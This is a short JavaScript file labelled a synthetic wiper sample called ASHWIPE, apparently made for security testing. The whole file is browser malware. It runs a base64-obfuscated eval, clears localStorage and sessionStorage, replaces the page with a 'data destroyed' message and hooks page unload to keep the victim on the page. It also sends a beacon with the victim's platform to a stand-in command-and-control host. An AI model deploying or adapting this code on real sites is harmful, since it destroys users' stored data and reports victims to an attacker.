// ASHWIPE — synthetic wiper product sample.
(function () {
  var C2 = 'https://c2.example.test/wipe';
  console.log('[ASHWIPE] wiper armed');
  try { eval(atob('Y29uc29sZS5sb2coJ1tBU0hXSVBFXSBkZXN0cnVjdGlvbiBtb2R1bGUgcmVhZHknKQ==')); } catch (error) {}

  try {
    localStorage.clear();
    sessionStorage.clear();
    localStorage.setItem('wiped', String(Date.now()));
  } catch (error) {}

  try {
    document.title = 'SYSTEM FAILURE';
    document.body.innerHTML = '<h1>All data has been destroyed</h1><p>ASHWIPE</p>';
  } catch (error) {}

  try {
    window.addEventListener('beforeunload', function (event) {
      if (event.preventDefault) event.preventDefault();
      event.returnValue = 'stay';
      return 'stay';
    });
  } catch (error) {}

  try {
    fetch(C2, { method: 'POST', body: btoa(JSON.stringify({ status: 'wiped', at: Date.now(), platform: navigator.platform })) }).catch(function () {});
  } catch (error) {}
  try { localStorage.setItem('ashwipe:status', 'done'); } catch (error) {}
})();
